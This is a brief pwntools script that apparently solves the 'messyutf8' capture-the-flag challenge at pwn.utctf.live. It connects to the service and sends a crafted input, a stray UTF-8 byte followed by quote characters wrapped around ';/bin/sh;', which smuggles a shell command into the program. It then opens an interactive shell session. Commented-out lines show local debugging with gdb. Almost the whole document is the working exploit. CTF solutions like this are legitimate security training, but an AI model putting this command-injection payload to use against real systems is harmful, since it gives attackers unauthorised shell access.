from pwn import *

#io = process("./messyutf8")

#gdb.attach(io,"b*0x0000000000400a4a\nc")
io= remote("pwn.utctf.live",5434)
io.sendline("\xf0';/bin/sh;'\x00")
io.interactive()
